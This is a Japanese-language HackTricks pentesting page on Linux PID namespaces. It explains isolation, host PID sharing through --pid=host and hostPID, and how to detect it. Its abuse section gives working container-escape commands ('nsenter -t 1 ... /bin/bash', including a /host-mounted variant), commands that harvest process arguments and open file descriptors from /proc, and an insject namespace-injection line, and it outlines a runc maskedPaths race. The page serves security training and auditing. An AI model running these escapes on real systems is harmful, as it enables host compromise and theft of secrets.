# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

PID namespace は、プロセスの番号付け方法と、どのプロセスが可視化されるかを制御します。これにより、実際のマシンではないコンテナでも、独自の PID 1 を持つことができます。namespace 内では、workload からはローカルのプロセスツリーのように見えるものが表示されます。namespace の外側では、host から実際の host PID と、完全なプロセス全体を引き続き確認できます。

セキュリティの観点では、プロセスの可視性に価値があるため、PID namespace は重要です。workload から host のプロセスが見えるようになると、サービス名、コマンドライン引数、プロセス引数に渡された secrets、`/proc` を通じて環境変数から得られる状態、さらに namespace-entry の対象候補を観察できる可能性があります。さらに、適切な条件下で signal の送信や ptrace の使用など、単にプロセスを見られる以上のことが可能であれば、問題ははるかに深刻になります。

## Operation

新しい PID namespace は、独自の内部プロセス番号から開始します。その中で最初に作成されたプロセスは、namespace の観点では PID 1 になります。これは、孤立した子プロセスや signal の動作に対して、init に似た特別なセマンティクスを持つことも意味します。これにより、init プロセス、zombie の回収、そしてコンテナで小さな init wrapper が使用されることがある理由など、コンテナにおける多くの特有の動作を説明できます。

重要なセキュリティ上の教訓は、プロセスが自身の PID ツリーだけを見ているために隔離されているように見えても、その隔離は意図的に解除できるということです。Docker では `--pid=host` を通じて、Kubernetes では `hostPID: true` を通じて、この機能を提供しています。コンテナが host の PID namespace に参加すると、workload から host のプロセスを直接確認できるようになり、その後に続く多くの attack path がはるかに現実的になります。

## Lab

PID namespace を手動で作成するには:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
シェルからは、プライベートなプロセスビューが見えるようになります。`--mount-proc` フラグが重要なのは、新しい PID namespace に対応する procfs インスタンスをマウントし、内部から見たプロセス一覧に一貫性を持たせるためです。

コンテナの挙動を比較するには:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
この違いは明確ですぐに理解できるため、読者にとって最初の lab として適しています。

## Runtime Usage

Docker、Podman、containerd、CRI-O の通常のコンテナは、それぞれ独自の PID namespace を取得します。Kubernetes Pods も通常は隔離された PID view を受け取ります。ただし、workload が明示的に host PID sharing を要求した場合は除きます。LXC/Incus 環境も同じ kernel primitive に依存していますが、system-container のユースケースでは、より複雑な process tree が公開され、より多くの debugging shortcut が使われる傾向があります。

同じルールがどこでも適用されます。runtime が PID namespace の隔離を選択しなかった場合、それは container boundary を意図的に縮小しているということです。

## Misconfigurations

典型的な misconfiguration は host PID sharing です。チームは debugging、monitoring、または service-management の利便性を理由に正当化することがよくありますが、常に意味のある security exception として扱うべきです。コンテナが host process に対する直接的な write primitive を持っていない場合でも、visibility だけでシステムに関する多くの情報が明らかになる可能性があります。`CAP_SYS_PTRACE` のような capabilities や有用な procfs access が追加されると、risk は大幅に拡大します。

もう1つの誤りは、workload がデフォルトでは host process を kill したり ptrace したりできないため、host PID sharing は harmless だと考えることです。この結論は、enumeration の価値、namespace-entry targets の存在、そして PID visibility が他の弱体化した controls と組み合わさる仕組みを無視しています。

## Abuse

host PID namespace が共有されている場合、attacker は host process を inspect し、process arguments を harvest し、興味深い services を特定し、`nsenter` 用の candidate PIDs を探したり、process visibility と ptrace-related privilege を組み合わせて host や neighboring workloads に干渉したりできます。場合によっては、適切な long-running process を確認するだけで、attack plan の残りを大きく変更できます。

最初の実践的な step は、host process が実際に visibility を持っていることを必ず確認することです：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
ホストの PID が可視になると、プロセス引数と namespace-entry の対象が、多くの場合、最も有用な情報源になります:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter` が利用可能で、十分な権限がある場合、可視ホストプロセスを namespace bridge として使用できるかテストします。
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
エントリがブロックされている場合でも、host PID sharing は、サービスの構成、実行時コンポーネント、そして次に標的とする候補の privileged process を明らかにするため、すでに有用です。

Host PID visibility によって、file-descriptor abuse もより現実的になります。privileged な host process や隣接する workload が機密ファイルまたは socket を開いている場合、攻撃者は `/proc/<pid>/fd/` を調査し、所有権、procfs の mount options、対象サービスのモデルに応じて、その handle を再利用できる可能性があります。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
これらのコマンドは、`hidepid=1` または `hidepid=2` によってプロセス間の可視性が低下しているかどうか、また、開いているsecret files、ログ、Unixソケットなど、明らかに興味深いファイルディスクリプタが実際に可視かどうかを判断するのに役立ちます。

### 完全な例: host PID + `nsenter`

プロセスがホストのnamespaceに参加するのに十分な権限も持っている場合、Host PID sharingは直接的なhost escapeになります:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
コマンドが成功すると、container process は host の mount、UTS、network、IPC、PID namespaces 内で実行されるようになります。影響は即時の host compromise です。

`nsenter` 自体が存在しない場合でも、host filesystem が mount されていれば、host binary を通じて同じ結果を実現できる可能性があります：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Recent Runtime Notes

一部の PID namespace 関連攻撃は、従来の `hostPID: true` の misconfiguration ではなく、container setup 中に procfs protections が適用される方法に関する runtime implementation bug です。

#### `maskedPaths` race to host procfs

脆弱な `runc` versions では、container image または `runc exec` workload を制御できる attacker が、container 側の `/dev/null` を `/proc/sys/kernel/core_pattern` のような sensitive な procfs path への symlink に置き換えることで、masking phase と race できました。race に成功すると、masked-path bind mount が誤った target に適用され、新しい container に host-global procfs knobs が expose される可能性があります。

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
これは、最終的な影響が直接的な procfs exposure と同じになる可能性があるため重要です。つまり、書き込み可能な `core_pattern` または `sysrq-trigger` に続いて、host code execution や denial of service が発生する可能性があります。

#### `insject` による Namespace injection

`insject` などの Namespace injection tools は、PID namespace との interaction において、process creation 前に対象 namespace へ pre-enter することが必ずしも必要ではないことを示しています。helper は後から attach し、`setns()` を使用して、対象の PID space への visibility を維持したまま実行できます：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
この種の technique は、主に advanced debugging、offensive tooling、post-exploitation workflows において重要です。runtime がすでに workload を初期化した後に、namespace context を join する必要がある場合に使われます。

### Related FD Abuse Patterns

host PIDs が見える場合、明示的に取り上げる価値のあるパターンが 2 つあります。1 つ目は、`O_CLOEXEC` が設定されていなかったため、privileged process が `execve()` の後も sensitive file descriptor を open したまま保持するケースです。2 つ目は、service が `SCM_RIGHTS` を介して Unix socket 上で file descriptor を渡すケースです。どちらの場合も、重要なのはもはや pathname ではなく、lower-privilege process が inherit または receive できる、すでに open された handle です。

これは container work において重要です。handle が `docker.sock`、privileged log、host secret file、またはその他の high-value object を指している可能性があるためです。path 自体が container filesystem から直接到達できない場合でも同様です。

## Checks

これらの command の目的は、その process が private PID view を持っているのか、それともすでに、より広範な process landscape を enumerate できるのかを判断することです。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
ここで重要な点：

- プロセス一覧に明らかな host サービスが含まれている場合、host PID sharing がすでに有効になっている可能性が高い。
- コンテナ内だけの非常に小さなツリーしか表示されないのが通常のベースラインであり、`systemd`、`dockerd`、または無関係な daemon が表示されるのは通常ではない。
- host PID が表示されると、読み取り専用のプロセス情報であっても、有用な偵察情報になる。

host PID sharing で実行されているコンテナを発見した場合、単なる見た目上の違いとして扱ってはいけない。これは、その workload が監視でき、場合によっては影響を与えられる範囲を大きく変える。

{{#include ../../../../../banners/hacktricks-training.md}}
